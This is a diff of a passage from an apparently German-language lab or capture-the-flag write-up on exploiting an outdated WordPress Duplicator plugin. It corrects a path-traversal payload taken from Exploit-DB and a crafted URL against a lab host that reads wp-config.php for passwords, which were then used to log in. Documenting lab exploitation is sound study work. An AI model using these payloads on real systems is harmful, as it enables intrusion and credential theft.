@@ -59,13 +59,13 @@ Die Version war veraltet und hatte eine bekannte Schwachstelle.
 In Exploit-DB habe ich folgenden Exploit gefunden:
 
 ```bash
-/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../.
+/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../.."+file
 ```
 
 Ich habe den Exploit so gebaut:
 
 ```bash
-http://192.168.1.205/S3cr3t/wp-admin/admin-ajax.php?action=duplicator_download&file../wp-config.php
+http://192.168.1.205/S3cr3t/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php
 ```
 
 Dadurch konnte ich die Datei mit Passwortinformationen lesen und mich im Webinterface anmelden.
